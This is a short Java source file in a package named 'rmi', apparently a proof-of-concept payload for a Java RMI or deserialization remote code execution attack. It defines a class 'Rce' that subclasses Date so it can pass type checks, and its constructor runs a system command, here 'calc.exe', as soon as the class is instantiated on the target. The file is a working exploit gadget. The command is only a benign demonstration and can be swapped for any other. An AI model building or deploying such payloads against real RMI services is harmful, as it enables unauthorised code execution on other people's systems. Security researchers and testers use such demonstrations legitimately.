package rmi;

import java.io.IOException;
import java.util.Date;

public class Rce extends Date {

  public Rce() throws IOException {
    Runtime runtime = Runtime.getRuntime();
    runtime.exec("calc.exe");
  }
}
